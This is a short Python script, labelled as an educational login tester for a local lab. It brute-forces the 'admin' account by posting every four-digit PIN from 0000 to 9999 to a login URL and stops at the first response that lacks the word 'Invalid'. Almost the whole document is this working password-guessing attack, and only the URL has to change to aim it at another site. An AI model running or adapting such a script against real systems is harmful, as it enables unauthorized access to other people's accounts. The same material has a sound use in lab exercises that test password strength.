"""
Simple Login Tester (For Educational Use Only)
Test against local lab environment.
"""

import requests

URL = "http://localhost/login"   # Change to local lab only
USERNAME = "admin"

def generate_passwords():
    return [str(i).zfill(4) for i in range(10000)]

def test_login(password):
    data = {
        "username": USERNAME,
        "password": password
    }

    try:
        response = requests.post(URL, data=data, timeout=3)
        return "Invalid" not in response.text
    except requests.exceptions.RequestException:
        return False

def main():
    print("Starting Login Test...\n")

    for password in generate_passwords():
        if test_login(password):
            print(f"[+] Weak Password Found: {USERNAME}:{password}")
            break
        else:
            print(f"[-] Tested: {password}")

if __name__ == "__main__":
    main()
